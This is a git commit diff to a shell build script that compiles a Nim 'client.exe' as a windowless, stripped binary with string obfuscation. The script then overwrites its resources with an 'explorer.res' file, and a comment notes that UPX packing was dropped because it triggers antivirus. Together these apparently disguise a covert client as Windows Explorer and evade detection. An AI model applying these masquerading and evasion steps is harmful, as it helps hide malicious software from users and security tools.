4ea6275b55217074638ba5028658188ccde25d4f
vieru <mixerandr3w001@gmail.com>
2021-04-04 08:42:10 +0300

    optiizari pt marime

--- cb.sh
+++ cb.sh
@@ -6,7 +6,7 @@ echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!
 #sleep 10
 
 # generate client.exe
-nim c --cpu:i386 -t:-m32 -l:-m32 -d:ssl -f --import:"$PWD\src\lib\functions\hideString.nim" -d:isProd=true -d:release -d:danger --opt:size --app:gui --passC:-flto -o:./dist/client.exe ./src/client.nim
+nim -f c --cpu:i386 -t:-m32 -l:-m32 --import:"$PWD\src\lib\functions\hideString.nim" -d:isProd=true -d:release -d:danger -d:strip --opt:size --app:gui --passc=-flto --passl=-flto -o:./dist/client.exe ./src/client.nim
 strip -s ./dist/client.exe
 # ./utils/upx.exe ./dist/client.exe # upx face antivirusii sa innebuneasca, il dezactivez momentan
 ./utils/rh.exe -open ./dist/client.exe -save ./dist/client.exe -action addoverwrite -res ./utils/explorer.res
